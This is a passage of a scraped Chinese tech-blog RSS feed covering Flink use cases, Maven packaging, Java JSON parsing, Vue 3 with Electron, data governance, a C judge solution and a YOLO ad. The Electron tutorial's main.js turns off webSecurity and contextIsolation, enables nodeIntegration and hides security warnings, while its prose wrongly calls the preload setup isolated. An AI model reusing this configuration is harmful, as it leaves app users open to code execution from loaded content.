金融行业是Flink实时计算的重要应用领域之一。在这个行业中，Flink被广泛应用于实时交易监控、实时风控、实时结算和通知推送等方面。
实时交易监控
在股市交易中，对交易监控的实时性要求极高。由于市场价格波动迅速，股民的交易行为需要得到即时的监管。Flink可以实时读取交易数据流，对交易行为进行分析和判断，并根据预设的规则和条件触发相应的监控措施。例如，当检测到用户在近几分钟内挂出的订单价格超过了当下价格的2%时，系统会立即采取阻断措施并发出告警。
实时风控
实时风控是金融行业的另一个重要应用。通过对交易数据进行实时分析，可以及时发现潜在的欺诈行为和异常交易。Flink可以根据一组预定义的规则和模式，从交易数据流中提取复杂事件，并进行处理和分析。例如，当检测到某个账户在短时间内发生了大量异常交易时，系统会立即触发风控措施并采取相应的风险控制措施。
实时结算和通知推送
实时结算和通知推送是金融行业的另一个重要应用场景。在实时交易中，需要实现交易的即时结算和通知推送。Flink可以实时读取交易数据流，对交易进行结算处理，并将结算结果实时推送给用户和相关部门。同时，Flink还可以根据用户的偏好和设置，将交易通知、账户变动等信息实时推送给用户，提高用户的满意度和忠诚度。
三、汽车行业应用
随着新能源汽车产业的快速发展，汽车行业对数据的依赖日益增加。Flink在汽车行业的应用主要集中在实时数据采集、实时分析和实时报警等方面。
实时数据采集
在车联网场景中，前端设备（如TBOX、TSB等车载平台）通常采集的是二进制数据。这些数据需要经过处理和分析才能转化为有用的信息。Flink可以实时读取这些二进制数据流，将其转换为结构化数据，并存储在数据库中供后续分析和使用。例如，通过实时采集车辆的行驶数据、故障数据等信息，可以对车辆的运行状态进行实时监控和预警。
实时分析
实时分析是汽车行业应用Flink的另一个重要场景。通过对实时采集的数据进行分析和处理，可以及时发现车辆的异常情况并采取相应的措施。例如，当检测到车辆的行驶速度异常、油耗异常或发动机故障时，系统会立即触发报警并采取相应的措施。同时，通过对历史数据的分析和挖掘，还可以为车辆维护和保养提供有力的支持。
实时报警
实时报警是汽车行业应用Flink的一个重要功能。当检测到车辆的异常情况或潜在风险时，需要立即触发报警机制以便相关人员能够迅速采取措施。Flink可以根据预设的规则和条件实时判断是否需要触发报警，并将报警信息推送给相关人员或系统。例如，当检测到车辆的发动机温度过高或轮胎气压过低时，系统会立即触发报警并通知驾驶员采取相应的措施。
四、零售与电商行业应用
在零售与电商行业中，Flink的应用主要集中在实时推荐、实时库存管理和实时数据分析等方面。
实时推荐
实时推荐是零售与电商行业应用Flink的一个重要场景。通过分析用户的购物历史、浏览记录、搜索记录等信息，可以为用户推荐符合其兴趣和需求的商品。Flink可以实时读取用户的购物数据流和商品数据流，对这些数据进行分析和处理，并根据用户的偏好和设置实时推荐相应的商品。例如，在电商平台上，当用户浏览某个商品时，系统会实时推荐与该商品相关的其他商品或类似商品给用户。
实时库存管理
实时库存管理是零售与电商行业的另一个重要应用。通过对实时库存数据进行监控和分析，可以及时发现库存的异常情况并采取相应的措施。例如，当检测到某个商品的库存量低于预设的阈值时，系统会立即触发补货机制并通知相关人员采取相应的措施。Flink可以实时读取库存数据流，对这些数据进行分析和处理，并根据预设的规则和条件触发相应的补货措施。
实时数据分析
实时数据分析在零售与电商行业中也有着广泛的应用。通过分析用户的购物行为、浏览记录、搜索记录等信息，可以深入了解用户的购物偏好和需求，为企业的营销策略和产品开发提供有力的支持。Flink可以实时读取用户的购物数据流和商品数据流，对这些数据进行分析和处理，并生成各种业务指标和报表供后续分析和使用。例如，通过分析用户的购物历史和浏览记录等信息，可以评估不同营销策略的效果和用户的购买意愿；通过分析商品的销售情况和用户评价等信息，可以优化产品的设计和开发策略。
五、物联网（IoT）应用
物联网是新一代信息技术的重要组成部分，它通过智能感知、识别技术与普适计算等通信感知技术将各种信息传感设备与互联网结合起来形成的一个巨大网络。Flink在物联网领域的应用主要集中在实时数据采集、实时分析和实时控制等方面。
实时数据采集
物联网设备通常会产生大量的实时数据，这些数据需要经过处理和分析才能转化为有用的信息。Flink可以实时读取物联网设备产生的数据流，对其进行处理和分析，并将结果存储在数据库中供后续使用。例如，在智能家居场景中，Flink可以实时读取各种智能家居设备（如智能灯泡、智能插座、智能门锁等）产生的数据流，对这些数据进行分析和处理，并根据用户的偏好和设置进行相应的控制操作。
实时分析
实时分析是物联网应用Flink的一个重要场景。通过对物联网设备产生的实时数据进行分析和处理，可以及时发现设备的异常情况或潜在风险并采取相应的措施。例如，在智慧城市场景中，Flink可以实时读取各种传感器（如温度传感器、湿度传感器、烟雾传感器等）产生的数据流，对这些数据进行分析和处理，并根据预设的规则和条件触发相应的报警或控制措施。同时，通过对历史数据的分析和挖掘还可以为城市管理和规划提供有力的支持。
实时控制
实时控制是物联网应用Flink的另一个重要功能。通过对物联网设备产生的实时数据进行监控和分析并根据分析结果进行相应的控制操作可以实现设备的智能化和自动化控制。例如，在工业自动化场景中Flink可以实时读取各种工业设备（如机床、生产线、机器人等）产生的数据流对这些数据进行分析和处理并根据分析结果进行相应的控制操作以实现生产过程的自动化和智能化控制。
综上所述，Flink在实时计算领域具有广泛的应用场景和重要的应用价值。无论是在金融行业、汽车行业、零售与电商行业还是物联网领域，Flink都能够提供高效、可靠、实时的数据处理和分析能力，为企业的运营和发展提供有力的支持。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540127.html</guid><pubDate>Fri, 31 Oct 2025 07:25:10 +0000</pubDate></item><item><title>怎么在地图导航上添加自己的店面定位？</title><link>https://www.ppmy.cn/news/1540128.html</link><description>在如今的数字化时代，互联网已经成为人们获取信息、寻找服务的重要途径。每当人们感到困惑时，都会通过网络搜索去寻找自己的答案，或者想知道周边有哪些店铺时，都会通过地图导航去查找并导航前往。因此，对于商家而言，如果能够在地图导航上添加自己的店面定位，无疑会极大地提升店铺的线上曝光率和知名度，从而吸引更多的潜在顾客前来消费。接下来，企小花将详细介绍
如何在地图导航平台上添加自己
的
店面定位，帮助商家轻松实现这一过程。
打开地图导航平台，登录自己的账号；
在个人页面中，找到“我的店铺”点击进去；
输入店名，认领自己的店铺，如果没有，就点击添加新门店；
按照要求完善店铺信息，包括但不限于门店分类、店铺位置、营业时间、联系电话、门脸照片、经营场所证明等；
店铺信息完善后，点击提交审核即可。
总之，在数字化时代的大背景下，充分利用地图导航平台添加店面定位是商家提升竞争力、拓展客源的重要举措。通过
遵循上述步骤
，
商家即可轻松完成店面在地图上的标注。这一过程不仅提升了顾客的查找便利性，更为商家带来了更多的曝光机会和潜在客户，是现代商业营销中不可或缺的一环。借助这一数字化工具，商家能够更好地融入数字化时代，实现业务的持续增长。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540128.html</guid><pubDate>Fri, 31 Oct 2025 07:25:12 +0000</pubDate></item><item><title>Maven项目打包为jar的几种方式</title><link>https://www.ppmy.cn/news/1540129.html</link><description>1.直接打包
通过==不打依赖包==的方式，仅仅只是打包出项目中的代码到JAR包中。在POM文件合适的位置添加如下plugin即可，随后执行maven install
&lt;plugin&gt;
&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;
&lt;configuration&gt;
&lt;source&gt;1.8&lt;/source&gt;
&lt;target&gt;1.8&lt;/target&gt;
&lt;/configuration&gt;
&lt;/plugin&gt;
2.将依赖JAR包输出到lib目录方式
将项目中的JAR包的依赖包输出到指定的目录下，修改==outputDirectory==配置，如下面的${project.build.directory}/lib.如想将打包好的JAR包可以通过==命令==直接运行，如java -jar xx.jar,还需要==制定mainfest配置==的classpathPrefix与上面配置的相对应，如上面把依赖JAR包输出到了lib，所以这里的classpathPrefix也应该指定为lib/; 同时，并制定出程序的入口类，在配置mainClass节点中配置好入口类的全类名。这种打包方式对于JAVA项目是通用的，不管是不是springboot项目还是普通的JAVA项目，都ok。
&lt;plugins&gt;
&lt;!-- java编译插件 --&gt;
&lt;plugin&gt;
&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;
&lt;configuration&gt;
&lt;source&gt;1.7&lt;/source&gt;
&lt;target&gt;1.7&lt;/target&gt;
&lt;encoding&gt;UTF-8&lt;/encoding&gt;
&lt;/configuration&gt;
&lt;/plugin&gt;
&lt;plugin&gt;
&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
&lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;
&lt;configuration&gt;
&lt;archive&gt;
&lt;manifest&gt;
&lt;addClasspath&gt;true&lt;/addClasspath&gt;
&lt;classpathPrefix&gt;lib/&lt;/classpathPrefix&gt;
&lt;mainClass&gt;com.yourpakagename.mainClassName&lt;/mainClass&gt;
&lt;/manifest&gt;
&lt;/archive&gt;
&lt;/configuration&gt;
&lt;/plugin&gt;
&lt;plugin&gt;
&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
&lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt;
&lt;executions&gt;
&lt;execution&gt;
&lt;id&gt;copy&lt;/id&gt;
&lt;phase&gt;install&lt;/phase&gt;
&lt;goals&gt;
&lt;goal&gt;copy-dependencies&lt;/goal&gt;
&lt;/goals&gt;
&lt;configuration&gt;
&lt;outputDirectory&gt;${project.build.directory}/lib&lt;/outputDirectory&gt;
&lt;/configuration&gt;
&lt;/execution&gt;
&lt;/executions&gt;
&lt;/plugin&gt;
&lt;/plugins&gt;
有时候为了方便，可以把classpath初始化在当前目录上，默认的classpath会在jar包内，可以在main方法配置后加上manifestEntries配置，指定classpath，如
&lt;plugin&gt;
&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
&lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;
&lt;configuration&gt;
&lt;classesDirectory&gt;target/classes/&lt;/classesDirectory&gt;
&lt;archive&gt;
&lt;manifest&gt;
&lt;!-- 主函数的入口 --&gt;
&lt;mainClass&gt;com.yourpakagename.mainClassName&lt;/mainClass&gt;
&lt;!-- 打包时 MANIFEST.MF文件不记录的时间戳版本 --&gt;
&lt;useUniqueVersions&gt;false&lt;/useUniqueVersions&gt;
&lt;addClasspath&gt;true&lt;/addClasspath&gt;
&lt;classpathPrefix&gt;lib/&lt;/classpathPrefix&gt;
&lt;/manifest&gt;
&lt;manifestEntries&gt;
&lt;Class-Path&gt;.&lt;/Class-Path&gt;
&lt;/manifestEntries&gt;
&lt;/archive&gt;
&lt;/configuration&gt;
&lt;/plugin&gt;
3.将项目依赖包和项目打为一个包
这种方式打包会将项目中的依赖包和项目的代码都打在一个jar包，配置如下：
&lt;plugin&gt;
&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
&lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;
&lt;version&gt;2.5.5&lt;/version&gt;
&lt;configuration&gt;
&lt;archive&gt;
&lt;manifest&gt;
&lt;mainClass&gt;com.xxg.Main&lt;/mainClass&gt;
&lt;/manifest&gt;
&lt;/archive&gt;
&lt;descriptorRefs&gt;
&lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;
&lt;/descriptorRefs&gt;
&lt;/configuration&gt;
&lt;/plugin&gt;
但是这种方式只能打java项目，如果是spring框架的jar就不可以了，而应该使用如下配置
&lt;plugin&gt;
&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
&lt;/plugin&gt;
如果项目中包含groovy代码，默认采用MAVEN打包时不会将groovy代码进行打包，需要加入如下配置
&lt;plugin&gt;
&lt;groupId&gt;org.codehaus.gmavenplus&lt;/groupId&gt;
&lt;artifactId&gt;gmavenplus-plugin&lt;/artifactId&gt;
&lt;version&gt;1.2&lt;/version&gt;
&lt;executions&gt;
&lt;execution&gt;
&lt;goals&gt;
&lt;goal&gt;addSources&lt;/goal&gt;
&lt;goal&gt;addStubSources&lt;/goal&gt;
&lt;goal&gt;compile&lt;/goal&gt;
&lt;goal&gt;execute&lt;/goal&gt;
&lt;/goals&gt;
&lt;/execution&gt;
&lt;/executions&gt;
&lt;/plugin&gt;</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540129.html</guid><pubDate>Fri, 31 Oct 2025 07:25:15 +0000</pubDate></item><item><title>JSON字符串转成java的Map对象</title><link>https://www.ppmy.cn/news/1540130.html</link><description>要将这个JSON字符串转换成Java对象，你可以定义一个
Element
类来表示每个要素，然后使用一个
Map
来存储这些要素。以下是具体的实现步骤：
步骤 1: 定义 Element 类
首先，定义一个
Element
类来表示每个要素的结构：
public class Element {private boolean checked;private String text;// 构造函数public Element() {}public boolean isChecked() {return checked;}public void setChecked(boolean checked) {this.checked = checked;}public String getText() {return text;}public void setText(String text) {this.text = text;}@Overridepublic String toString() {return "Element{" +"checked=" + checked +", text='" + text + '\'' +'}';}
}
步骤 2: 使用 Jackson 库解析 JSON
使用Jackson库来解析JSON字符串并将其转换为
Map
：
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;import java.io.IOException;
import java.util.HashMap;
import java.util.Map;public class JsonToJavaExample {public static void main(String[] args) {String jsonString = "{"+ "\"要素1\": {\"checked\":true,\"text\":\"cscaad\"},"+ "\"要素2\": {\"checked\":true,\"text\":\"cscaad\"},"+ "\"要素3\": {\"checked\":true,\"text\":\"cscaad\"}"+ "}";ObjectMapper mapper = new ObjectMapper();try {// 将JSON字符串解析为ObjectNodeObjectNode objectNode = (ObjectNode) mapper.readTree(jsonString);// 创建一个Map来存储要素Map&lt;String, Element&gt; elements = new HashMap&lt;&gt;();// 遍历ObjectNode并将每个要素转换为Element对象objectNode.fieldNames().forEachRemaining(key -&gt; {Element element = mapper.convertValue(objectNode.get(key), Element.class);elements.put(key, element);});// 打印转换后的要素elements.forEach((key, value) -&gt; {System.out.println(key + ": " + value.getText() + ", " + value.isChecked());});} catch (IOException e) {e.printStackTrace();}}
}
步骤 3: 添加 Jackson 依赖
确保你的项目中已经添加了Jackson库的依赖。如果你使用Maven，可以在
pom.xml
文件中添加以下依赖：
&lt;dependency&gt;&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;&lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;&lt;version&gt;2.13.0&lt;/version&gt;
&lt;/dependency&gt;
解释
Element 类
：定义了一个
Element
类，包含
checked
和
text
属性，以及相应的getter和setter方法。
JSON 字符串
：定义了一个包含三个要素的JSON字符串。
ObjectMapper
：使用Jackson的
ObjectMapper
类来解析JSON字符串。
ObjectNode
：
在这个例子中，我们首先将JSON字符串解析为
ObjectNode
，然后遍历所有的字段，并将每个字段的值转换为
Element
对象。最后，我们将这些
Element
对象存储在一个
Map
中，以便于访问。
打印结果
：遍历
Map
并打印每个要素的详细信息。
通过这种方式，你可以将包含多个要素的JSON字符串转换为Java对象，并访问每个要素的属性。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540130.html</guid><pubDate>Fri, 31 Oct 2025 07:25:17 +0000</pubDate></item><item><title>vue3集成electron</title><link>https://www.ppmy.cn/news/1540131.html</link><description>安装说明
vue集成electron时，会用到两个依赖。分别是electron和electron-builder，前者是开发环境下使用，后者是打包部署时使用。安装时，可在线安装也可离线安装。所谓离线安装就是自己下载好用到的包，然后放到指定目录下。其实在线安装时候，也是这个过程，只是它自己去下载包。
本次集成过程，没有开VPN，访问github，基本不通。所以最终安装时候，采用了在线+离线方式安装，因为有些包需要从github上下载。整个安装过程如下。
创建一个vue3项目
创建过程参考vue3官网。执行npm run dev运行项目，浏览器页面展示如下：
安装electron作为开发依赖
用上面创建的vue3项目做测试，开始集成electron。执行如下命令开始安装。
npm install electron --save-dev
通常这一步安装会报如下错误。
这是因为镜像地址问题，有些没有配置，有些无法访问。所以我们直接手动修改镜像地址，改为国内镜像源。
说明一下，npm的配置文件是.npmrc，相当于Maven中的配置文件settings.xml。都是用来管理依赖包的镜像源。文件路径一般在用户目录下，如C:\Users\ZHANGJUN\.npmrc。
我们也可以用命令查找下
npm config get userconfig
现在我们执行如下命令，修改配置文件，将electron镜像源添加进去。我这里用的华为镜像源，用其他的都行。只要能正常访问即可。
npm config set ELECTRON_MIRROR https://repo.huaweicloud.com/electron/
如果因为权限问题或其他问题，导致上面命令报错，添加失败。我们也可以直接打开配置文件，手动修改。
可以直接到文件目录下，打开文件，如C:\Users\ZHANGJUN\.npmrc。也可以通过命令打开。执行如下命令后，会弹出npmrc页面，然后将上面地址添加进去。
npm config edit
修改完后，再次执行npm install electron --save-dev。又出现如下错误，后面排查是版本问题。所以安装命令带上版本号。
npm install electron@29.1.1 --save-dev
可以看到，在带上版本后，安装成功。我们也可以在package.json和node_modules中看到添加的electron内容。
添加electron配置文件
在项目跟目录下创建electron目录，然后新增main.js、preload.js等
main.js代码
const { app, BrowserWindow, Menu, session, globalShortcut } = require('electron')
const { join } = require('path')
const path = require('path')
//const preloadPath = app.isPackaged ? "../../preload.js" : "../preload.js";
const preloadPath = './preload.js'
const renderProcessApi = path.resolve(__dirname, preloadPath)
// process.env.DIST = join(process.env.DIST_ELECTRON, "../dist");
// const indexHtml = join(process.env.DIST, "index.html");
process.env['ELECTRON_DISABLE_SECURITY_WARNINGS'] = true
const createWindow = async () =&gt; {Menu.setApplicationMenu(null)const win = new BrowserWindow({// width: 1024,// height: 768,width: 1040,height: 807,fullscreen: true, //全屏title: 'electron测试项目',// frame: false, //直接去除导航头部show: true,webPreferences: {webSecurity: false,nodeIntegration: true,enableRemoteModule: true,contextIsolation: false,preload: renderProcessApi}})// win.loadFile(join(__dirname, "../dist/index.html"));const env = app.isPackaged ? 'production' : 'development'console.log('env ' + env)console.log('process.env.NODE_ENV ' + process.env.VITE_APP_ENV)const indexHtml = {development: 'http://localhost:5173', // 开发环境// development: join(__dirname, "../dist/index.html"), // 开发环境production: join(__dirname, '../dist/index.html') // 生产环境}if (app.isPackaged) {win.loadFile(indexHtml[env])} else {win.loadURL(indexHtml[env])}globalShortcut.register('Ctrl + Shift + i', function () {win.webContents.openDevTools()})globalShortcut.register('f11', function () {if (win.isFullScreen()) {win.setFullScreen(false)} else {win.setFullScreen(true)}})
}
app.whenReady().then(async () =&gt; {// if (!app.isPackaged) {//   await session.defaultSession.loadExtension(//     join(__dirname, "../plugins/vuetools6.6.1_0")//   );// }createWindow()app.on('activate', () =&gt; {if (BrowserWindow.getAllWindows().length === 0) createWindow()})
})
app.on('window-all-closed', () =&gt; {if (process.platform !== 'darwin') app.quit()
})
preload.js代码
// 所有的 Node.js API接口 都可以在 preload 进程中被调用.
// 它拥有与Chrome扩展一样的沙盒。
window.addEventListener('DOMContentLoaded', () =&gt; {const replaceText = (selector, text) =&gt; {const element = document.getElementById(selector)if (element) element.innerText = text}for (const dependency of ['chrome', 'node', 'electron']) {replaceText(`${dependency}-version`, process.versions[dependency])}
})
这里简单解释下main.js和preload.js。
main.js
任何 Electron 应用程序的入口都是 main 文件。 这个文件控制了主进程，它运行在一个完整的Node.js环境中，负责控制应用的生命周期。
在此脚本中，使用 Electron 的 app 和 BrowserWindow 模块来创建一个浏览器窗口，在一个单独的进程(渲染器)中显示网页内容。
preload.js
预加载脚本，在electron网页页面加载前执行，可以做一些初始化工作。
暴露 Node.js 功能给渲染进程。通过在 preload.js 中使用 exposeInMainWorld 方法，开发者可以将 Node.js 的模块或 Electron 的功能安全地暴露给渲染进程的页面。这样，渲染进程就可以像使用前端库一样使用这些功能，而不需要直接操作 Electron 的远程对象。
提供安全的上下文环境：preload.js 运行在一个特殊的上下文中，它与页面的普通 JavaScript 环境是隔离的。这样可以防止页面脚本直接访问 Node.js 的某些敏感功能，增强了应用的安全性。
模块化管理：preload.js 可以作为模块化管理的入口，将一些通用的逻辑或工具函数预先加载到渲染进程中，以便在不同的页面或组件中复用。
main.js主要用来创建一个window窗口，调用api设置窗口大小、样式等。并设置开发环境和生产环境下访问地址。
而preload.js主要用来进行一些初始化工作，比如读取配置文件，全局初始化等。
添加完上面两个js后，还有一个配置要修改。那就是package.json。将type改为commonjs，main改为electron/main.js。然后在scripts中新增一条语句："start": "vite | electron ."
到此配置工作结束，运行项目，看能否正常显示。执行
npm run start
页面以window窗口形式运行，里面页面展示和浏览器展示效果一样。至此，vue3开发环境集成electron就基本结束了。
electron打包构建
项目最终还是要打包部署，这里使用electron-builder。执行命令安装
npm install electron-builder -D或 
npm install electron-builder@24.13.3 -D
修改package.json，添加打包信息。
在scripts标签中新增命令："electron:build": "vite build &amp;&amp; electron-builder"。后续执行npm run electron:build 即可完成打包。
新增build字段，添加如下内容：
"build": {"productName": "electronDemo","appId": "electronDemo","asar": true,"directories": {"output": "dist-electron/${version}"},"files": ["dist","electron"],"nsis": {"oneClick": false,"allowToChangeInstallationDirectory": true,"installerIcon": "./electron/icon.ico","uninstallerIcon": "./electron/icon.ico","installerHeaderIcon": "./electron/icon.ico","createDesktopShortcut": true,"createStartMenuShortcut": true,"shortcutName": "electron系统"},"mac": {"category": "your.app.category.type"},"win": {"icon": "./electron/icon.ico","target": [{"target": "nsis","arch": ["ia32"]}]},"linux": {}}
其中：
productName：项目名，也是生成的安装文件名
appId：软件的ID，用来上架各平台
nsis：软件安装包的交互行为，配置稍多
win.icon： 应用图标
win.target.arch：建议设置ia32，适配windows大部分版本
"asar": false, 打包时不进行加密
修改完后，执行命令。开始打包
npm run electron:build
构建过程中，会从github上下载三个包，分别是winCodeSign-2.6.0.7z、nsis-3.0.4.1.7z、nsis-resources-3.4.1.7z。前文已经说过，github基本访问不通，所以我这里下载肯定失败。报错如下：
前文也说过，npm在线下载过程也是从远程服务器上把安装包下载到本地。所以这里我就手动把这三个包都下载下来。然后放到对应的electron缓存目录下。至于electron缓存目录及执行过程详细情况，大家仔细百度（基本就是首次将包下载到缓存中，以后直接从缓存中获取）。
electron缓存目录路径为：C:\Users\zjun\AppData\Local
可以看到有两个，electron开发环境时用到，也就是在我们执行npm install electron@29.1.1 --save-dev时，它会把包下载到electron/Cache下。同理，如果这个命令也下载不了，我们也可以先把包下载下来，然后放到这个缓存目录下。包名就是electron-v29.1.1-win32-ia32.zip。
这是electron/Cache下内容
这是electron-builder/Cache下内容。只需将三个安装包放到对应目录下，然后解压即可。
三个包都添加完后，再次执行打包命令：npm run electron:build。不出意外下，打包成功，如下图：
target显示的就是打包后的名称及路径。到这个目录下，双击exe安装。
安装成功后，桌面会有exe的快捷方式。运行看是否正常。
至此。electron的集成和打包基本结束。
至于某些博主提到的热更新：npm install nodemon -D和命令行合并工具：npm install npm-run-all -D。我发现项目已经有了这些功能，所以就不再安装。需要测试的话，可自行安装测试。
参考文档：
https://blog.csdn.net/weixin_45687201/article/details/136424017
使用electron创建桌面应用及常见打包错误解决_wincodesign-2.6.0.7z-CSDN博客
vite+vue3+electron项目搭建教程_electron vue3 vite配置-CSDN博客
https://blog.csdn.net/qq_39124701/article/details/128299948
简介 | Electron
全网详解 .npmrc 配置文件：比如.npmrc的优先级、命令行，如何配置.npmrc以及npm常用命令等-CSDN博客</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540131.html</guid><pubDate>Fri, 31 Oct 2025 07:25:19 +0000</pubDate></item><item><title>解读大数据治理：数据管理的新纪元</title><link>https://www.ppmy.cn/news/1540132.html</link><description>解读大数据治理：数据管理的新纪元
在数字化时代，企业和组织生成的数据量呈指数级增长。虽然大数据为业务洞察和决策制定提供了强大的支持，但若不加以有效管理，数据混乱可能导致信息失真的问题。因此，大数据治理应运而生。通过这篇博客，我们将以简单易懂的方式介绍大数据治理的基本概念、重要性，以及如何在企业中实施这一技术。
什么是大数据治理？
大数据治理是对数据资产进行管理、控制和保护的过程，确保数据在企业内的高质量和合规使用。它涉及制定并实施策略和流程，以维护数据的准确性、一致性、完整性和安全性。大数据治理不仅关注数据的技术层面，也包括数据的业务价值和合规性。
核心元素
数据质量管理
：确保数据准确、及时和完整，以支持有效的业务决策。
数据标准化
：定义数据格式和规范，确保不同系统间数据的可互操作性。
数据安全与隐私
：保护数据免受未经授权的访问和数据泄露，遵循相关法律法规。
元数据管理
：管理描述数据的“数据”，帮助理解数据来源、内容及使用方式。
数据治理架构
：制定清晰的角色与职责，包括数据所有者、数据管理员等。
为什么大数据治理如此重要？
提升决策质量
高质量的数据是准确分析和业务决策的基础。大数据治理确保数据的可靠性，使管理层能做出更明智的决策。
确保合规和安全
面对越来越严格的数据保护法规（如GDPR、CCPA），大数据治理帮助企业合规，避免法律风险和潜在的罚款。
提高数据可用性和一致性
通过标准化和数据集成，治理过程提升了数据一致性，使跨部门协作更为顺畅。
优化数据管理成本
有效的数据治理降低了冗余数据存储和管理的成本，提升了数据处理的效率和效益。
实施大数据治理的关键步骤
建立数据治理团队
组建由业务与IT人员组成的跨职能团队，明确管理流程和责任，确保数据治理的有效执行。
制定数据治理策略
根据企业的业务需求与目标，制定全局性的数据治理策略和实施路线图，包括数据质量、安全和标准化策略。
数据分类和定义
对数据进行分类和命名规范定义，明确数据的业务意义和技术规范，以确保数据在各系统间一致和可理解。
实施数据质量控制
建立实时监控和质量检查机制，确保数据的完整性和准确性，发现问题及时整改。
元数据管理
开发和实施元数据管理工具，以描述和跟踪数据的来源、格式及流动，提高数据的追溯性和透明度。
教育与变更管理
推动全员参与的数据文化变革，加强对员工的数据治理意识和技能培训，实现数据治理的持续改进。
常见挑战与解决方案
获取高层支持
：高层支持对于推动治理计划至关重要。定期汇报治理成效，展示数据治理对业务的直接好处。
数据孤岛
：通过制定统一的数据接口和标准化协议，减少不同部门和系统间的数据隔离。
资源和技术限制
：选择合适的工具和平台，逐步实现自动化治理流程，降低人力和技术门槛。
总结
大数据治理是数据驱动时代必不可少的一环。它确保企业内数据的准确、安全和最大化使用效率，不仅增强了数据的业务价值，还降低了相关的运营风险。随着数据量的持续增长，企业需要不断优化其数据治理策略，以迎接各类挑战和机遇。通过扎实的治理实践，数据将真正成为企业的核心资产，驱动更强和更智能的业务增长。如果你的企业正面临数据管理的挑战，现在是时候认真考虑并启动大数据治理计划了。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540132.html</guid><pubDate>Fri, 31 Oct 2025 07:25:22 +0000</pubDate></item><item><title>xtu oj 原根</title><link>https://www.ppmy.cn/news/1540133.html</link><description>文章目录
回顾
杂
思路
c 语言代码
回顾
A+B III
问题 H: 三角数
问题 G: 3个数
等式 数组下标查询，降低时间复杂度
1405 问题 E: 世界杯
xtu 数码串
xtu oj 神经网络
xtu oj 1167 逆序数（大数据）
杂
有一些题可能是往年的程设的题，现在搬到
c
语言题里面了，把一些
c++
的代码改一下改成
c
的差不多就能过。有些程设的题可能是外国算法竞赛题翻译了一下拿过来的，所以写不出很正常，不要沮丧。（网上能搜到的程设的题解，笔者就不写了，我也不会写，有点无奈）
这里随便贴几个网上程设题解的链接
xtu oj 问题 D: 拼图
xtu oj 问题 H: 刷油漆
xtu oj 问题 L: 奇偶数位
xtu oj 问题 G: 完全平方数II
这个题题目的名字改了一下，原来叫平方数
有时候搜题解的时候，可以搜一搜题号，好像有些题改了一下题目的名字
旧 oj ：需要用校园网才能访问
算了，不管那么多，现在就先把这题拿下！
这题好像我没啥思路，等我问下朋友搞清楚了继续写。先试一下，要是能写出来就不问了。写了一下直接超时了。
我把我的超时代码贴在这儿，不知道为啥超时了，感觉只有
O(n)
的时间复杂度，不至于超时的呀。
注意下面不是正确代码。
#
include
&lt;stdio.h&gt;
#
include
&lt;stdbool.h&gt;
int
a
[
100010
]
;
int
main
(
)
{
int
p
;
while
(
scanf
(
"%d"
,
&amp;
p
)
)
{
for
(
int
i
=
1
;
i
&lt;
100010
;
i
++
)
{
a
[
i
]
=
0
;
}
int
g
=
2
;
for
(
int
i
=
1
;
i
&lt;=
p
-
1
;
i
++
)
{
a
[
g
]
=
1
;
g
*=
2
;
g
%=
p
;
}
bool flag
=
false
;
for
(
int
i
=
1
;
i
&lt;=
p
-
1
;
i
++
)
{
if
(
a
[
i
]
==
0
)
{
printf
(
"No\n"
)
;
flag
=
true
;
break
;
}
}
if
(
flag
==
false
)
{
printf
(
"Yes\n"
)
;
}
}
return
0
;
}
思路
哈哈哈，把代码发给朋友，他告诉我加一个
EOF
过了，我的思路就是直接模拟题意，
bool
数组用来判断当前这个数字是不是出现了，出现了就标记为
1
，奥其实这里用布尔数组更加明确一些，就是下标表示的是出现的这个数字，然后每一次都要取模，不取模容易超出存储范围，这里可能需要注意一个数学知识，就是一边做乘法一边取模，和对计算的结果取模结果是同一个。
其他的好像没有什么需要注意的。
这个题虽然写出来了，但是还有一个题还是没写出来，明天我再写一写，写不出来再去问朋友，一定要解决。
c 语言代码
#
include
&lt;stdio.h&gt;
#
include
&lt;stdbool.h&gt;
int
a
[
100010
]
;
int
main
(
)
{
int
p
;
while
(
scanf
(
"%d"
,
&amp;
p
)
!=
EOF
)
{
for
(
int
i
=
1
;
i
&lt;
100010
;
i
++
)
{
a
[
i
]
=
0
;
}
int
g
=
2
;
for
(
int
i
=
1
;
i
&lt;=
p
-
1
;
i
++
)
{
a
[
g
]
=
1
;
g
*=
2
;
g
%=
p
;
}
bool flag
=
false
;
for
(
int
i
=
1
;
i
&lt;=
p
-
1
;
i
++
)
{
if
(
a
[
i
]
==
0
)
{
printf
(
"No\n"
)
;
flag
=
true
;
break
;
}
}
if
(
flag
==
false
)
{
printf
(
"Yes\n"
)
;
}
}
return
0
;
}</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540133.html</guid><pubDate>Fri, 31 Oct 2025 07:25:25 +0000</pubDate></item><item><title>YOLOV11改进系列指南</title><link>https://www.ppmy.cn/news/1540134.html</link><description>基于Ultralytics的YOLO11改进项目.(69.9¥)
目前自带的一些改进方案(持续更新)
为了感谢各位对本项目的支持,本项目的赠品是yolov5-PAGCP通道剪枝算法.
具体使用教程
专栏改进汇总
YOLO11系列
二次创新系列
